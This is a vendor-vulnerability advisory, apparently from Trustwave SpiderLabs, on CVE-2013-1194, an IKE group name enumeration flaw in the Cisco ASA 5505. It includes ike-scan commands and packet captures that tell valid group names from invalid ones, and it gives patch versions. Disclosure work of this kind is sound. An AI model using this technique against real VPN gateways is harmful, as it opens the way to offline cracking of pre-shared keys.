The Cisco ASA 5505 delivers ， high-performance firewall , SSL and IPsec VPN , and rich networking services ， in a modular , \"plug-and-play\" appliance. ， Finding 1 : Group Name Enumeration ， Credit : Daniel Turner of Trustwave SpiderLabs ， CVE : CVE-2013-1194 ， CWE : CWE-206 ， Each VPN configuration is assigned a group name , which is used to manage ， separate Security Associations. Previous advisories have found that when a ， VPN endpoint is configured to allow Aggressive Mode IKE negotiations using ， PSK , a hash of the PSK can be captured and potentially cracked offline. In ， order to successfully crack this hash a correct group name is required. ， The above product versions are susceptible to a group name enumeration ， vulnerability , because of a difference in the way the device responds to ， correct and incorrect group names sent in the initial exchange packet. ， Similar to CSCeg00323 and CSCtj96108 where this was possible because of no ， response and a response with a DPD payload respectively. It has been found ， that it remains possible to distinguish a correct group name by the number ， of response packets sent by the device. A correct group name elicits three ， attempts to continue the handshake and an additional encrypted phase 2 ， packet , while the device will only respond twice to an incorrect group. ， Enumeration is slow because of the requirement to wait for the responding ， packets , but this has been successfully accomplished. Below are examples of ， the different responses :  ， Example 1 :  ，  # Request using invalid group name ， ike-scan 10.70.70.25 -M -A -id=incorrectgroup ，  # Response using invalid group name ， 13 : 22 : 59.929273 IP 10.70.70.204.isakmp > 10.70.70.25.isakmp : isakmp : phase 1 I agg ， 13 : 22 : 59.932624 IP 10.70.70.25.isakmp > 10.70.70.204.isakmp : isakmp : phase 1 R agg ， 13 : 23 : 05.696571 IP 10.70.70.25.isakmp > 10.70.70.204.isakmp : isakmp : phase 1 R agg ， Example 2 :  ，  # Request using valid group name ， ike-scan 10.70.70.25 -M -A -id=correctgroup ，  # Response using valid group name ， 13 : 23 : 05.693673 IP 10.70.70.204.isakmp > 10.70.70.25.isakmp : isakmp : phase 1 I agg ， 13 : 23 : 13.690392 IP 10.70.70.25.isakmp > 10.70.70.204.isakmp : isakmp : phase 1 R agg ， 13 : 23 : 21.690464 IP 10.70.70.25.isakmp > 10.70.70.204.isakmp : isakmp : phase 1 R agg ， 13 : 23 : 29.690528 IP 10.70.70.25.isakmp > 10.70.70.204.isakmp : isakmp : phase 1 R agg ， 13 : 23 : 37.691275 IP 10.70.70.25.isakmp > 10.70.70.204.isakmp : isakmp : phase 2/others R inf [ E ]  ， This information can be used to capture and crack a weak PSK if Aggressive ， Mode is enabled. ， Remediation Steps :  ， The vendor will be releasing security fixes to the above issues and affected ， versions can be patched by installing the 8.4 ( 6 ) firmware or the 9.1 ( 2 )  ， firmware for the Cisco ASA platform. Administrators with other affected ， firmware versions should be aware that this information could be ， potentially be revealed and it is recommended that factory default group or ， easily guessable group names are not used.",
